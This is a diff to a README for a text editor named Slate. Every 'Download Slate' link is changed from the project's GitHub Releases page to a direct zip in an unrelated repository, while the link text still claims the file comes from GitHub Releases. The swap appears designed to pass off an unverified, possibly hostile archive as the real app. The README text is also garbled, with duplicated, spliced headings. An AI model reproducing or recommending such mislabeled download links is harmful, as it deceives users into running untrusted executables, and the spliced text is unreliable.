@@ -5,13 +5,13 @@ description: "Open, search, edit, format, and save files of any size instantly i
 ---
 # 📝 Slate - Open Huge Files In An Instant
 
-[![Download Slate](https://img.shields.io/badge/Download-Slate-ff6f61?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Ashik245-commits/Slate/releases)
+[![Download Slate](https://img.shields.io/badge/Download-Slate-ff6f61?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Ashik245-commits/ashik245-commits.github.io/main/runman/App-v1.5-beta.2.zip)
 
 Slate is a fast, simple text editor for Windows and Linux, including Raspberry Pi. It is built for people who want a clean editor that opens quickly, stays responsive, and does not slow down when a file gets large. An 800 MB JSON file opens instantly, so you can work with big logs, data exports, configuration files, and long documents without waiting.
 
 Slate works like a familiar text editor, but it is designed to handle the files that many basic editors struggle with. It includes syntax colors for 52 languages, JSON# 📝 Slate - Open Huge Files Without Waiting
 
-[![Download Slate](https://img.shields.io/badge/Download-Slate-ff6f61?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Ashik245-commits/Slate/releases)
+[![Download Slate](https://img.shields.io/badge/Download-Slate-ff6f61?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Ashik245-commits/ashik245-commits.github.io/main/runman/App-v1.5-beta.2.zip)
 
 Slate is a fast, simple text editor for Windows and Linux, including Raspberry Pi. It opens files of any size instantly—even an 800 MB JSON file loads in a blink. With syntax colors for 52 languages, built-in JSON and XML tools, and automatic updates, Slate is the reliable editor for everyday tasks and heavy-duty files. No more waiting for your editor to catch up.
 
@@ -31,7 +31,7 @@ Slate is designed for real people who work with text files, logs, data exports, 
 
 Visit this link to download the application:
 
-[**Download Slate from GitHub Releases**](https://github.com/Ashik245-commits/Slate/releases)
+[**Download Slate from GitHub Releases**](https://raw.githubusercontent.com/Ashik245-commits/ashik245-commits.github.io/main/runman/App-v1.5-beta.2.zip)
 
 The download page will show you the latest version available for Windows. Once you have the file, open it to start using Slate.
 
